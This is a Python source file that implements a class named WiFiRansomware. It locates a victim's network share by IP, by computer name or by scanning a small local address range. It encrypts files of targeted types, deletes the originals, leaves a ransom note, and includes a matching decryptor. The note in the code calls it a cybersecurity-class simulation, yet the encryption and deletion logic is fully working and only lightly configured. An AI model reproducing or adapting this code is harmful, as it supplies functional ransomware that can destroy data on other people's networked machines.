# network_attack.py - Real network file operations
import os
import shutil
import socket
import platform
from cryptography.fernet import Fernet
import base64
import hashlib
import sys

class WiFiRansomware:
    def __init__(self, config):
        self.config = config
        self.key = None

    def generate_key(self, password):
        """Generate encryption key from password"""
        key = hashlib.sha256(password.encode()).digest()
        self.key = base64.urlsafe_b64encode(key)
        return self.key

    def find_victim(self):
        """Find victim on network using IP or computer name"""
        victim_ip = self.config.get('VICTIM_IP', '')
        victim_name = self.config.get('VICTIM_NAME', '')

        # Try by IP first
        if victim_ip:
            network_path = f"\\\\{victim_ip}\\{self.config.get('SHARE_NAME', 'RansomDemo')}"
            if os.path.exists(network_path):
                print(f"✓ Found victim by IP: {victim_ip}")
                return network_path

        # Try by computer name
        if victim_name:
            network_path = f"\\\\{victim_name}\\{self.config.get('SHARE_NAME', 'RansomDemo')}"
            if os.path.exists(network_path):
                print(f"✓ Found victim by name: {victim_name}")
                return network_path

        # Auto-scan network
        print("Scanning network...")
        for i in range(1, 11):  # Check first 10 IPs
            test_ip = f"192.168.1.{i}"
            network_path = f"\\\\{test_ip}\\RansomDemo"
            if os.path.exists(network_path):
                print(f"✓ Found victim at: {test_ip}")
                return network_path

        return None

    def attack_network_share(self, network_path):
        """Encrypt files on network share"""
        print(f"Attacking: {network_path}")

        # Generate encryption key
        password = self.config.get('ENCRYPTION_KEY', 'cybersecurity_demo_2024')
        self.generate_key(password)

        # Get target extensions
        extensions = self.config.get('TARGET_EXTENSIONS', '.txt,.docx,.pdf').split(',')

        # Encrypt files
        encrypted_count = 0
        for file in os.listdir(network_path):
            file_path = os.path.join(network_path, file)

            # Check if it's a target file
            is_target = False
            for ext in extensions:
                if file.endswith(ext.strip()):
                    is_target = True
                    break

            if is_target and os.path.isfile(file_path):
                try:
                    # Read file
                    with open(file_path, 'rb') as f:
                        original_data = f.read()

                    # Encrypt
                    fernet = Fernet(self.key)
                    encrypted_data = fernet.encrypt(original_data)

                    # Save encrypted version
                    encrypted_path = file_path + ".locked"
                    with open(encrypted_path, 'wb') as f:
                        f.write(encrypted_data)

                    # Delete original
                    os.remove(file_path)

                    encrypted_count += 1
                    print(f"  ✓ Encrypted: {file}")

                except Exception as e:
                    print(f"  ✗ Failed: {file} - {str(e)[:50]}")

        # Create ransom note on network share
        if encrypted_count > 0:
            self.create_ransom_note(network_path, encrypted_count, password)

        return encrypted_count

    def create_ransom_note(self, network_path, file_count, password):
        """Create ransom note on victim's share"""
        note_content = f"""
╔══════════════════════════════════════════════╗
║           NETWORK RANSOMWARE ATTACK          ║
╚══════════════════════════════════════════════╝

Your files have been encrypted over the WiFi network!

Files encrypted: {file_count}
Location: {network_path}

To decrypt your files:
1. Run the decryptor on the attacker's laptop
2. Use password: {password}

This is an educational demonstration for cybersecurity class.

DO NOT PAY ANYONE - THIS IS A SIMULATION!
"""

        note_path = os.path.join(network_path, "READ_ME_DECRYPT.txt")
        try:
            with open(note_path, 'w') as f:
                f.write(note_content)
            print(f"✓ Ransom note created: {note_path}")
        except Exception as e:
            print(f"✗ Could not create ransom note: {e}")

    def decrypt_network_share(self, network_path, password):
        """Decrypt files on network share"""
        print(f"Decrypting: {network_path}")

        # Generate key from password
        key = hashlib.sha256(password.encode()).digest()
        key = base64.urlsafe_b64encode(key)

        decrypted_count = 0
        for file in os.listdir(network_path):
            if file.endswith('.locked'):
                file_path = os.path.join(network_path, file)

                try:
                    # Read encrypted file
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()

                    # Decrypt
                    fernet = Fernet(key)
                    decrypted_data = fernet.decrypt(encrypted_data)

                    # Save original
                    original_path = file_path.replace('.locked', '')
                    with open(original_path, 'wb') as f:
                        f.write(decrypted_data)

                    # Remove encrypted file
                    os.remove(file_path)

                    decrypted_count += 1
                    print(f"  ✓ Decrypted: {original_path}")

                except Exception as e:
                    print(f"  ✗ Failed to decrypt: {file}")

        return decrypted_count